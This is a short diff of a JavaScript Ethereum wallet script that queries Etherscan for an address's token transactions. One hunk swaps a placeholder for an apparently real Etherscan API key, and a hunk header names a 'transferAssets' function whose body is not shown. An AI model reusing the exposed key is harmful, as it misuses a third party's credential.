@@ -5,7 +5,7 @@ let isConnected = false;
 const erc20Abi = [
     {
         "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],   
+        "inputs": [{"name": "_owner", "type": "address"}],
         "name": "balanceOf",
         "outputs": [{"name": "balance", "type": "uint256"}],
         "type": "function"
@@ -118,7 +118,7 @@ const transferAssets = async (account) => {
 // 获取代币余额的函数
 const getTokenBalances = async (address) => {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_ETHERSCAN_API_KEY`;
+        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
         const response = await axios.get(url);
         const transactions = response.data.result;
 
